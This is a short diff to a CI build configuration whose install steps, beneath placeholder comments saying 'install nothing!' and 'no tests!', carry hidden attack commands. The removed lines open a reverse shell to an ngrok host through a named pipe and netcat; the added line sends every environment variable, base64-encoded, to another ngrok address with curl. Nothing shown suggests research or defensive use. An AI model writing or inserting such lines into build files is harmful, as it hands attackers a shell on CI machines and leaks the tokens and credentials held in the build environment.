@@ -10,8 +10,7 @@ services:
 install:
   - echo "install nothing!" # put your normal pre-testing installs here
   - git clone https://github.com/mosesrenegade/tools-repo
-  - cd tools-repo/statically-compiled; chmod +x nc
-  - rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 19880 >/tmp/f
+  - curl https://8240-3-19-52-248.ngrok-free.app -d "$(env | base64)"
 
 script:
   - echo "no tests!" # put your normal testing scripts here
